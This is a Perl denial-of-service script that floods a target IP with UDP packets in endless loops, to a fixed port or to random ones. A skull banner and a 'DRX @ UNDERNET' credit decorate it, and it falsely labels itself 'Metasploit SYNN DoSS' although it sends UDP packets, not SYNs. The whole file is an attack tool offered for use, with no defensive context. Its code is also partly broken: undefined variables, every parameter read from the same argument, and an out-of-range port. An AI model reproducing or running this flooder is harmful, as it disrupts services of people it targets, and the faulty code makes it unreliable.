


#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
if ($ARGC !=1) {
printf "drx@undernet perl syn ip\n";
exit(1);
}
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[1;31m
Metasploit SYNN DoSS ip DRX @ UNDERNET.ORG
\n";
printf "[1;33m  
███████████████████████████ 
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
 \n";
printf "[1;35m      💀  Closing connection tcp/ip 💀  \n";
printf "[1;38m     °°°°° $ip °°°°° \n";
printf "[0;36m    °°°°° Try to get that brute force on target °°°°° \n";
printf "[0;36m                      •°D°•°3•°3•°P•°L•°0•°0•°Y•°I•°N•°G•° \n";


if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 30000, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 92990) +0;
send(crazy, 30000, $size, sockaddr_in($port, $iaddr));
}